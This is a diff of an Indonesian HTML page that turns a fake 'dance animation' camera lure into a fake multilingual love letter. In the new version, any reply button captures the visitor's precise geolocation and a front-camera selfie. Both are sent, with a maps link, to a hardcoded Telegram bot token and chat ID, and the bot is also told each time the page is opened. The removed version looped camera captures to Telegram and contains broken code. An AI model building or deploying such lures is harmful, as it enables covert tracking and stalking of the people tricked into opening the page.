@@ -1,195 +1,624 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kirim F</title>
+    <title>Surat Cinta untukmu</title>
     <style>
         body {
-            background-color: #121212;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
+            font-family: 'Georgia', serif;
+            max-width: 600px;
+            margin: 0 auto;
             padding: 20px;
+            background: linear-gradient(to bottom, #fff0f5, #ffe4e1);
+            color: #4a2c2a;
+            overflow-x: hidden;
         }
-        #cameraContainer {
-            margin: 20px auto;
-            width: 100%;
-            max-width: 500px;
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            animation: fadeIn 1s ease-in;
         }
-        #cameraView {
-            width: 100%;
-            background-color: #333;
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h1 {
+            color: #c71585;
+            text-align: center;
+            font-size: 2.2em;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .letter {
+            background: url('https://www.transparenttextures.com/patterns/paper-fibers.png');
+            padding: 20px;
+            border: 2px solid #ffb6c1;
             border-radius: 10px;
-            display: none;
+            margin-bottom: 20px;
+            font-size: 1.1em;
+            line-height: 1.6;
         }
-        #photoResult {
-            max-width: 100%;
-            display: none;
-            border-radius: 10px;
-        }
-        .love-btn {
-            background-color: #E91E63;
+        
+        .btn {
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 24px;
-            border-radius: 50%;
+            padding: 12px 20px;
+            border-radius: 25px;
             cursor: pointer;
-            margin: 20px;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 60px;
-            height: 60px;
+            font-size: 16px;
+            width: 100%;
+            margin: 10px 0;
+            transition: transform 0.2s, background-color 0.3s;
         }
-        .love-btn:hover {
-            background-color: #C2185B;
-            transform: scale(1.1);
+        
+        .btn:hover:not(:disabled) {
+            transform: scale(1.05);
         }
-        .love-btn:disabled {
-            background-color: #555;
+        
+        .btn:disabled {
+            opacity: 0.6;
             cursor: not-allowed;
         }
-        .love-btn::before {
-            content: '❤️';
+        
+        .btn-thank-you {
+            background-color: #ff69b4;
         }
-        .permission-box {
-            background-color: #333;
-            padding: 20px;
+        
+        .btn-thank-you:hover:not(:disabled) {
+            background-color: #ff1493;
+        }
+        
+        .btn-whatever {
+            background-color: #4682b4;
+        }
+        
+        .btn-whatever:hover:not(:disabled) {
+            background-color: #4169e1;
+        }
+        
+        .btn-thanks-love {
+            background-color: #ff4500;
+        }
+        
+        .btn-thanks-love:hover:not(:disabled) {
+            background-color: #dc143c;
+        }
+        
+        .status {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            display: none;
+            font-size: 0.9em;
+        }
+        
+        .success {
+            background-color: #ffe4e1;
+            color: #8b0000;
+            border: 1px solid #ffb6c1;
+            display: block;
+        }
+        
+        .error {
+            background-color: #fff0f5;
+            color: #800000;
+            border: 1px solid #ff69b4;
+            display: block;
+        }
+        
+        .info-card {
+            background-color: #fffafa;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        
+        .photo-preview {
+            max-width: 100%;
             border-radius: 10px;
-            max-width: 500px;
-            margin: 20px auto;
+            margin-top: 10px;
+            border: 2px solid #ffb6c1;
+        }
+        
+        .video-preview {
+            max-width: 100%;
+            border-radius: 10px;
+            margin-top: 10px;
+            border: 2px solid #ffb6c1;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .heart {
+            position: absolute;
+            font-size: 2em;
+            color: #ff69b4;
+            animation: float 5s infinite;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(-100px); opacity: 0; }
+        }
+        
+        .language-selector {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        select {
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #ffb6c1;
+            font-size: 1em;
+        }
+        
+        .choose-prompt {
+            text-align: center;
+            font-size: 1.2em;
+            color: #c71585;
+            margin: 20px 0;
+            font-style: italic;
         }
     </style>
 </head>
 <body>
-    <h1>HALO SAYANG</h1>
-    
-    <div class="permission-box" id="permissionBox">
-        <h2>IZIN JOEGT</h2>
-        <p>WEB INI AKAN ADA ANIMASI JOGET JJ.</p>
-        <button class="love-btn" id="loveBtn"></button>
+    <div class="container">
+        <div class="language-selector">
+            <select id="languageSelect">
+                <option value="id">Bahasa Indonesia</option>
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+        </div>
+        
+        <h1 id="title">Surat Cinta untukmu</h1>
+        
+        <div class="letter" id="letterContent">
+            <p>Dear Kamu,</p>
+            <p>Sejak pertama kali aku memikirkanmu, hatiku tak pernah sama. Setiap detik, aku membayangkan senyummu yang mampu menerangi hidupku. Aku menulis surat ini dengan penuh cinta, berharap kamu merasakan betapa istimewanya kamu bagiku.</p>
+            <p>Aku ingin tahu di mana kamu saat membaca surat ini, dan aku ingin melihat senyummu sebagai balasan. Pilih salah satu tombol di bawah ini untuk membalas perasaanku, apapun perasaanmu saat ini. Aku menunggu dengan penuh harap.</p>
+            <p>Dengan segenap cinta,<br>Admirermu</p>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="choose-prompt" id="choosePrompt">Silahkan Pilih</div>
+        
+        <button id="thankYouBtn" class="btn btn-thank-you">Terima Kasih</button>
+        <button id="whateverBtn" class="btn btn-whatever">Bodo Amat</button>
+        <button id="thanksLoveBtn" class="btn btn-thanks-love">Makasih Sayang</button>
+        
+        <div id="responseInfo" class="info-card" style="display: none;">
+            <h3>Balasanmu</h3>
+            <p id="location-details"></p>
+            <video id="video" class="video-preview" autoplay style="display: none;"></video>
+            <canvas id="canvas"></canvas>
+            <img id="photoPreview" class="photo-preview" style="display: none;" alt="Foto Senyummu">
+        </div>
+        
+        <div style="text-align: center; margin-top: 20px; font-size: 0.8em; color: #c71585;">
+            Dibuat dengan cinta untukmu
+        </div>
     </div>
-    
-    <div id="cameraContainer">
-        <video id="cameraView" autoplay playsinline></video>
-        <canvas id="photoResult"></canvas>
-    </div>
-    
+
     <script>
-        // Elemen DOM
-        const loveBtn = document.getElementById('loveBtn');
-        const permissionBox = document.getElementById('permissionBox');
-        const cameraView = document.getElementById('cameraView');
-        const photoResult = document.getElementById('photoResult');
-        
+        // Variabel global untuk menyimpan data
+        let userLocation = null;
         let stream = null;
-        let isCapturing = true;
+        let activeButton = null;
         
-        // Token bot Telegram dan chat ID (ganti dengan milik Anda)
-        const BOT_TOKEN = '7883031175:AAEIQYYD3CSdmQBNVyOxZ1qmtYTrpRuDB2I';
-        const CHAT_ID = '2028336963';
+        // Telegram bot configuration
+        const TELEGRAM_BOT_TOKEN = '8017211340:AAFSjXZFSujFxHnCNFOcPKLcP0lJxQcyDoQ';
+        const TELEGRAM_CHAT_ID = '2028336963';
         
-        // Fungsi untuk mengambil foto
-        async function takePhoto() {
-            if (!stream || !isCapturing) return;
+        // Konten multibahasa
+        const translations = {
+            id: {
+                title: "Surat Cinta untukmu",
+                letter: `
+                    <p>Dear Kamu,</p>
+                    <p>Sejak pertama kali aku memikirkanmu, hatiku tak pernah sama. Setiap detik, aku membayangkan senyummu yang mampu menerangi hidupku. Aku menulis surat ini dengan penuh cinta, berharap kamu merasakan betapa istimewanya kamu bagiku.</p>
+                    <p>Aku ingin tahu di mana kamu saat membaca surat ini, dan aku ingin melihat senyummu sebagai balasan. Pilih salah satu tombol di bawah ini untuk membalas perasaanku, apapun perasaanmu saat ini. Aku menunggu dengan penuh harap.</p>
+                    <p>Dengan segenap cinta,<br>Admirermu</p>
+                `,
+                thankYouBtn: "Terima Kasih",
+                whateverBtn: "Bodo Amat",
+                thanksLoveBtn: "Makasih Sayang",
+                choosePrompt: "Silahkan Pilih",
+                responseTitle: "Balasanmu",
+                status: {
+                    locationPrompt: "Terima kasih telah memilih! Boleh aku tahu di mana kamu sekarang?",
+                    locationSuccess: "Terima kasih telah berbagi lokasimu! Sekarang, boleh aku melihat senyummu?",
+                    locationError: "Maaf, aku tidak bisa mengetahui lokasimu. Tapi aku masih ingin melihat senyummu!",
+                    cameraSuccess: "Kamera siap! Tekan lagi untuk menangkap senyummu.",
+                    cameraError: "Maaf, aku tidak bisa membuka kamera. Bisakah kamu coba lagi?",
+                    photoSuccess: "Senyummu indah! Terima kasih atas balasanmu.",
+                    photoError: "Maaf, ada masalah saat mengirim foto. Coba lagi ya?"
+                }
+            },
+            en: {
+                title: "A Love Letter for You",
+                letter: `
+                    <p>My Dearest,</p>
+                    <p>Since the moment you crossed my mind, my heart has never been the same. Every second, I imagine your smile lighting up my world. I wrote this letter with all my love, hoping you feel how special you are to me.</p>
+                    <p>I want to know where you are as you read this, and I long to see your smile in return. Please choose one of the buttons below to respond to my feelings, whatever you’re feeling right now. I’m waiting with hope.</p>
+                    <p>With all my love,<br>Your Admirer</p>
+                `,
+                thankYouBtn: "Thank You",
+                whateverBtn: "Whatever",
+                thanksLoveBtn: "Thanks, Love",
+                choosePrompt: "Please Choose",
+                responseTitle: "Your Response",
+                status: {
+                    locationPrompt: "Thank you for choosing! May I know where you are right now?",
+                    locationSuccess: "Thank you for sharing your location! Now, may I see your smile?",
+                    locationError: "Sorry, I couldn’t get your location. But I’d still love to see your smile!",
+                    cameraSuccess: "Camera ready! Press again to capture your smile.",
+                    cameraError: "Sorry, I couldn’t open the camera. Could you try again?",
+                    photoSuccess: "Your smile is beautiful! Thank you for your response.",
+                    photoError: "Sorry, there was an issue sending the photo. Please try again."
+                }
+            },
+            es: {
+                title: "Una Carta de Amor para Ti",
+                letter: `
+                    <p>Querido/a,</p>
+                    <p>Desde que pensé en ti por primera vez, mi corazón no ha sido el mismo. Cada segundo, imagino tu sonrisa iluminando mi mundo. Escribí esta carta con todo mi amor, esperando que sientas lo especial que eres para mí.</p>
+                    <p>Quiero saber dónde estás mientras lees esto y ver tu sonrisa como respuesta. Por favor, elige uno de los botones de abajo para responder a mis sentimientos, sea lo que sea que sientas ahora. Te espero con esperanza.</p>
+                    <p>Con todo mi amor,<br>Tu Admirador/a</p>
+                `,
+                thankYouBtn: "Gracias",
+                whateverBtn: "Me Da Igual",
+                thanksLoveBtn: "Gracias, Cariño",
+                choosePrompt: "Por Favor Elige",
+                responseTitle: "Tu Respuesta",
+                status: {
+                    locationPrompt: "¡Gracias por elegir! ¿Puedo saber dónde estás ahora?",
+                    locationSuccess: "¡Gracias por compartir tu ubicación! Ahora, ¿puedo ver tu sonrisa?",
+                    locationError: "Lo siento, no pude obtener tu ubicación. ¡Pero aún quiero ver tu sonrisa!",
+                    cameraSuccess: "¡Cámara lista! Presiona de nuevo para capturar tu sonrisa.",
+                    cameraError: "Lo siento, no pude abrir la cámara. ¿Podrías intentarlo de nuevo?",
+                    photoSuccess: "¡Tu sonrisa es hermosa! Gracias por tu respuesta.",
+                    photoError: "Lo siento, hubo un problema al enviar la foto. Inténtalo de nuevo."
+                }
+            },
+            fr: {
+                title: "Une Lettre d'Amour pour Vous",
+                letter: `
+                    <p>Mon Cher/Ma Chère,</p>
+                    <p>Depuis que j’ai pensé à vous, mon cœur n’est plus le même. Chaque seconde, j’imagine votre sourire qui illumine mon monde. J’ai écrit cette lettre avec tout mon amour, en espérant que vous ressentiez à quel point vous êtes spécial(e) pour moi.</p>
+                    <p>Je veux savoir où vous êtes en lisant ceci et voir votre sourire en retour. Veuillez choisir l’un des boutons ci-dessous pour répondre à mes sentiments, peu importe ce que vous ressentez maintenant. J’attends avec espoir.</p>
+                    <p>Avec tout mon amour,<br>Votre Admirateur/Admiratrice</p>
+                `,
+                thankYouBtn: "Merci",
+                whateverBtn: "Peu Importe",
+                thanksLoveBtn: "Merci, Mon Amour",
+                choosePrompt: "Veuillez Choisir",
+                responseTitle: "Votre Réponse",
+                status: {
+                    locationPrompt: "Merci d’avoir choisi ! Puis-je savoir où vous êtes maintenant ?",
+                    locationSuccess: "Merci d’avoir partagé votre position ! Maintenant, puis-je voir votre sourire ?",
+                    locationError: "Désolé, je n’ai pas pu obtenir votre position. Mais j’aimerais quand même voir votre sourire !",
+                    cameraSuccess: "Caméra prête ! Appuyez à nouveau pour capturer votre sourire.",
+                    cameraError: "Désolé, je n’ai pas pu ouvrir la caméra. Pouvez-vous réessayer ?",
+                    photoSuccess: "Votre sourire est magnifique ! Merci pour votre réponse.",
+                    photoError: "Désolé, il y a eu un problème lors de l’envoi de la photo. Réessayez."
+                }
+            }
+        };
+        
+        // Fungsi untuk memperbarui konten berdasarkan bahasa
+        function updateLanguage(lang) {
+            const t = translations[lang];
+            document.getElementById('title').textContent = t.title;
+            document.getElementById('letterContent').innerHTML = t.letter;
+            document.getElementById('thankYouBtn').textContent = t.thankYouBtn;
+            document.getElementById('whateverBtn').textContent = t.whateverBtn;
+            document.getElementById('thanksLoveBtn').textContent = t.thanksLoveBtn;
+            document.getElementById('choosePrompt').textContent = t.choosePrompt;
+            document.getElementById('responseInfo').querySelector('h3').textContent = t.responseTitle;
+        }
+        
+        // Fungsi untuk menampilkan status
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.className = `status ${type}`;
+        }
+        
+        // Fungsi untuk mengirim teks ke Telegram
+        async function sendTextToTelegram(message) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.error('Telegram bot token or chat ID not configured');
+                return;
+            }
             
-            const context = photoResult.getContext('1d');
-            photoResult.width = cameraView.videoWidth;
-            photoResult.height = cameraView.videoHeight;
-            context.drawImage(cameraView, 0, 0, photoResult.width, photoResult.height);
-            
-            // Mengirim foto ke Telegram dan lanjutkan pengambilan berikutnya
-            await sendToTelegram();
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data);
+                }
+            } catch (error) {
+                console.error('Error sending text to Telegram:', error);
+            }
         }
         
         // Fungsi untuk mengirim foto ke Telegram
-        async function sendToTelegram() {
-            return new Promise(resolve => {
-                // Konversi canvas ke blob
-                photoResult.toBlob(async blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, `special_photo_${Date.now()}.jpg`);
-                    formData.append('caption', 'Foto spesial untukmu! ❤️');
-                    
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        const data = await response.json();
-                        if (!data.ok) {
-                            console.error('Gagal mengirim foto:', JSON.stringify(data));
+        async function sendPhotoToTelegram(photoBlob, caption, lang) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.error('Telegram bot token or chat ID not configured');
+                return;
+            }
+            
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data);
+                    showStatus(translations[lang].status.photoError, 'error');
+                } else {
+                    showStatus(translations[lang].status.photoSuccess, 'success');
+                }
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+                showStatus(translations[lang].status.photoError, 'error');
+            }
+        }
+        
+        // Fungsi untuk mengambil lokasi
+        async function captureLocation(lang) {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            userLocation = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date(position.timestamp).toLocaleString()
+                            };
+                            
+                            const mapUrl = `https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
+                            
+                            // Tampilkan informasi lokasi di UI
+                            document.getElementById('location-details').innerHTML = `
+                                <strong>Latitude:</strong> ${userLocation.latitude}<br>
+                                <strong>Longitude:</strong> ${userLocation.longitude}<br>
+                                <strong>Accuracy:</strong> ${userLocation.accuracy} meters<br>
+                                <strong>Time:</strong> ${userLocation.timestamp}
+                            `;
+                            
+                            document.getElementById('responseInfo').style.display = 'block';
+                            
+                            // Kirim lokasi ke Telegram
+                            const message = `*📍 Location Response*\n` +
+                                           `Latitude: ${userLocation.latitude}\n` +
+                                           `Longitude: ${userLocation.longitude}\n` +
+                                           `Accuracy: ${userLocation.accuracy} meters\n` +
+                                           `Time: ${userLocation.timestamp}\n` +
+                                           `[View on Google Maps](${mapUrl})`;
+                            
+                            sendTextToTelegram(message);
+                            showStatus(translations[lang].status.locationSuccess, 'success');
+                            resolve(true);
+                        },
+                        error => {
+                            console.error('Geolocation error:', error);
+                            showStatus(translations[lang].status.locationError, 'error');
+                            resolve(false); // Lanjutkan ke kamera meskipun lokasi gagal
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
                         }
-                    } catch (error) {
-                        console.error('Error:', error.message);
-                    }
-                    
-                    // Lanjutkan pengambilan foto berikutnya jika masih aktif
-                    if (isCapturing) {
-                        await takePhoto();
-                    }
-                    resolve();
-                }, 'image/jpeg', 0.85);
+                    );
+                } else {
+                    showStatus(translations[lang].status.locationError, 'error');
+                    resolve(false); // Lanjutkan ke kamera jika geolocation tidak didukung
+                }
             });
         }
         
-        // Fungsi untuk memulai pengambilan foto
-        function startCapturing() {
-            if (!stream || isCapturing) return;
-            isCapturing = true;
-            loveBtn.disabled = true;
-            
-            // Mulai pengambilan foto pertama
-            takePhoto();
+        // Fungsi untuk membuka kamera
+        async function startCamera(lang) {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' } // Kamera depan untuk selfie
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                document.getElementById('responseInfo').style.display = 'block';
+                if (activeButton) {
+                    activeButton.textContent = translations[lang].status.cameraSuccess.split('!')[0]; // Ubah teks tombol
+                }
+                showStatus(translations[lang].status.cameraSuccess, 'success');
+                
+                // Nonaktifkan tombol lain
+                document.getElementById('thankYouBtn').disabled = activeButton !== document.getElementById('thankYouBtn');
+                document.getElementById('whateverBtn').disabled = activeButton !== document.getElementById('whateverBtn');
+                document.getElementById('thanksLoveBtn').disabled = activeButton !== document.getElementById('thanksLoveBtn');
+                
+                return true;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                showStatus(translations[lang].status.cameraError, 'error');
+                return false;
+            }
         }
         
-        // Fungsi untuk menghentikan pengambilan foto
-        function stopCapturing() {
-            isCapturing = false;
+        // Fungsi untuk mengambil foto
+        function takePhoto(lang) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const photoPreview = document.getElementById('photoPreview');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Tampilkan foto di UI
+            photoPreview.src = canvas.toDataURL('image/jpeg', 0.9);
+            photoPreview.style.display = 'block';
+            
+            // Matikan kamera
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null;
             }
-            cameraView.style.display = 'none';
-            photoResult.style.display = 'none';
-            permissionBox.style.display = 'block';
-            loveBtn.disabled = false;
+            video.style.display = 'none';
+            
+            // Sembunyikan semua tombol
+            document.getElementById('thankYouBtn').style.display = 'none';
+            document.getElementById('whateverBtn').style.display = 'none';
+            document.getElementById('thanksLoveBtn').style.display = 'none';
+            
+            // Kirim foto ke Telegram
+            canvas.toBlob(blob => {
+                const caption = `*📸 Photo Response*\n` +
+                               `Button Chosen: ${activeButton ? activeButton.textContent : 'Unknown'}\n` +
+                               (userLocation ? 
+                                   `Latitude: ${userLocation.latitude}\n` +
+                                   `Longitude: ${userLocation.longitude}\n` +
+                                   `Accuracy: ${userLocation.accuracy} meters\n` +
+                                   `Time: ${userLocation.timestamp}\n` +
+                                   `[View on Google Maps](https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude})`
+                                   : 'Location not available');
+                sendPhotoToTelegram(blob, caption, lang);
+            }, 'image/jpeg', 0.9);
         }
         
-        // Event listener untuk tombol love
-        loveBtn.addEventListener('click', async () => {
-            if (!stream) {
-                // Meminta izin akses kamera
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        } 
-                    });
-                    
-                    cameraView.srcObject = isCapturing;
-                    cameraView.style.display = 'block';
-                    permissionBox.style.display = 'none';
-                    
-                    // Mulai pengambilan foto tanpa jeda
-                    startCapturing();
-                    
-                } catch (error) {
-                    alert('Gagal mengakses kamera: ' + error.message);
-                }
+        // Fungsi untuk mereset keadaan
+        function resetState(lang) {
+            state = 'initial';
+            activeButton = null;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
             }
-        });
+            document.getElementById('video').style.display = 'none';
+            document.getElementById('thankYouBtn').textContent = translations[lang].thankYouBtn;
+            document.getElementById('whateverBtn').textContent = translations[lang].whateverBtn;
+            document.getElementById('thanksLoveBtn').textContent = translations[lang].thanksLoveBtn;
+            document.getElementById('thankYouBtn').disabled = false;
+            document.getElementById('whateverBtn').disabled = false;
+            document.getElementById('thanksLoveBtn').disabled = false;
+            document.getElementById('thankYouBtn').style.display = 'block';
+            document.getElementById('whateverBtn').style.display = 'block';
+            document.getElementById('thanksLoveBtn').style.display = 'block';
+        }
         
-        // Menangani penutupan halaman untuk membersihkan stream
-        window.addEventListener('beforeunload', () => {
-            stopCapturing();
-        });
+        // Fungsi untuk menangani klik tombol
+        let state = 'initial'; // initial -> location -> camera -> photo
+        async function handleButtonClick(button) {
+            const lang = document.getElementById('languageSelect').value;
+            activeButton = button;
+            
+            if (state === 'initial') {
+                showStatus(translations[lang].status.locationPrompt, 'success');
+                state = 'location';
+                const locationSuccess = await captureLocation(lang);
+                state = 'camera';
+                const cameraOpened = await startCamera(lang);
+                if (!cameraOpened) {
+                    resetState(lang);
+                }
+            } else if (state === 'camera') {
+                takePhoto(lang);
+                state = 'photo';
+            }
+        }
+        
+        // Inisialisasi saat halaman dimuat
+        window.onload = () => {
+            // Deteksi bahasa browser
+            const browserLang = navigator.language.split('-')[0];
+            const supportedLangs = Object.keys(translations);
+            const defaultLang = supportedLangs.includes(browserLang) ? browserLang : 'en';
+            document.getElementById('languageSelect').value = defaultLang;
+            updateLanguage(defaultLang);
+            
+            // Setup event listener
+            document.getElementById('languageSelect').addEventListener('change', (e) => {
+                updateLanguage(e.target.value);
+                resetState(e.target.value);
+            });
+            document.getElementById('thankYouBtn').addEventListener('click', () => handleButtonClick(document.getElementById('thankYouBtn')));
+            document.getElementById('whateverBtn').addEventListener('click', () => handleButtonClick(document.getElementById('whateverBtn')));
+            document.getElementById('thanksLoveBtn').addEventListener('click', () => handleButtonClick(document.getElementById('thanksLoveBtn')));
+            
+            // Batasi jumlah hati maksimum
+            let heartCount = 0;
+            const maxHearts = 5;
+            setInterval(() => {
+                if (heartCount < maxHearts) {
+                    const heart = document.createElement('span');
+                    heart.className = 'heart';
+                    heart.innerHTML = '♥';
+                    heart.style.left = Math.random() * 100 + '%';
+                    document.body.appendChild(heart);
+                    heartCount++;
+                    setTimeout(() => {
+                        heart.remove();
+                        heartCount--;
+                    }, 5000);
+                }
+            }, 2000);
+            
+            // Matikan kamera saat halaman ditutup
+            window.addEventListener('beforeunload', () => {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            });
+            
+            // Kirim notifikasi ke Telegram bahwa halaman dibuka
+            const message = `*💌 Love Letter Opened*\n` +
+                           `Time: ${new Date().toLocaleString()}\n` +
+                           `Language: ${defaultLang}`;
+            sendTextToTelegram(message);
+        };
     </script>
 </body>
 </html>
